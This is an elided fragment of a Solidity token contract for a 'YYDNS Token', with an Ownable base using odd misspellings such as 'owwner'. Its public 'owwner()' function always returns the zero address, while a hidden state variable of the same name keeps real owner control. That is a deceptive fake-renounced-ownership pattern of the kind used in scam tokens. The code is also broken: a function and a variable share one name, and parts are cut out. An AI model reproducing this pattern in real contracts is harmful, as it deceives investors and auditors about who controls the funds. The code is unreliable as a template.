...
contract Ownable {
    address public owwner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owwner);
        _;
    }

/**
    * @dev Returns the address of the current owwner.
     */
    function owwner() public pure returns (address) {
        return address(0);
    }
    ...
    function transferowneresship(address newowneres) public onlyowneres {
        ...
        emit owneresshipTransferred(owwner, newowneres);
        owwner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owwner, address(0));
        owwner = address(0);
    }
}
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'YYDNS Token';

    string constant public symbol = 'YYDNS';
    ...
    address public projectAddress = 0x08F6bcF4860efDEe76D4b42E3c1dFAF55F0Eb67A;
